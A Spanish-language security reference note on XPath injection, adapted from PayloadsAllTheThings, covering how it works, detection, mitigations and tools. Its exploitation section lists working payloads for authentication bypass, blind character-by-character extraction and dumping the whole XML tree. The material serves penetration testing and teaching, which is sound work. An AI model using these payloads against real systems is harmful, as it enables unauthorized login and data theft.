---
tags:
  - seguridad-web
  - owasp
  - xpath
aliases:
  - Inyección XPath
  - XPath Injection
  - XPATH Injection
---

# Inyección XPath

**La inyección XPath ocurre cuando una aplicación construye consultas XPath concatenando entrada del usuario sin sanear, permitiendo alterar la lógica de la consulta sobre un documento XML.** Es el equivalente de SQLi pero sobre XML: se usa habitualmente contra autenticación o búsquedas respaldadas por ficheros XML.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
La app evalúa una expresión XPath contra un XML (por ejemplo, usuarios y contraseñas). Si concatena la entrada, el atacante inyecta sintaxis XPath que cambia el resultado booleano de la consulta:

```
//user[name/text()='$user' and password/text()='$pass']
```

Inyectando `' or '1'='1` en `$user`, la condición siempre es verdadera y se omite la autenticación. A diferencia de SQL, XPath no tiene comentarios ni control de acceso por nodo: si controlas la consulta, puedes recorrer **todo** el documento.

## Detección y pruebas
Prueba metacaracteres que rompan la sintaxis (`'`, `"`, `]`, `(`) y observa errores de XPath o cambios de comportamiento. Diferencia entre inyección **autenticada** (login) y de **búsqueda**. Como no hay tablas separadas, todo el XML es accesible, lo que facilita el blind XPath por extracción carácter a carácter.

## Explotación / payloads
**Bypass de autenticación:**

```
' or '1'='1
' or ''='
admin' or '1'='1' or 'a'='a
') or ('1'='1
```

**Extracción ciega (blind)** — inferir el documento nodo a nodo:

```
' and string-length(name(/*[1]))=4 and '1'='1     # longitud del nodo raíz
' and substring(name(/*[1]),1,1)='u' and '1'='1   # primer carácter
' and count(/*[1]/*)>2 and '1'='1                  # nº de hijos
```

**Volcado de todo el árbol** (cuando la salida es visible):

```
']  | //*  | a['          # devuelve todos los nodos
' or position()=1 or '
```

## Mitigación
- Usar **consultas XPath parametrizadas** (precompiladas con variables), nunca concatenar entrada.
- Escapar/validar la entrada con listas de permitidos; rechazar comillas y metacaracteres XPath.
- Aplicar el mismo control de acceso que en cualquier consulta a datos; no almacenar credenciales en XML plano.
- Tratar XPath 2.0/3.0 con cuidado: añaden funciones que amplían la superficie (incluido acceso a documentos externos).

## Herramientas
- **Burp Suite** (Repeater/Intruder) — fuzzing de payloads y blind por respuesta.
- **xcat** — explotación automatizada de blind XPath (extracción del documento).

---
🔗 Relacionado: [[Inyección NoSQL]] · [[Inyección LDAP]] · [[Inyección SQL (SQLi)]] · [[Inyección XSLT]]
📚 Fuente: [PayloadsAllTheThings — XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection) (MIT, © Swissky)
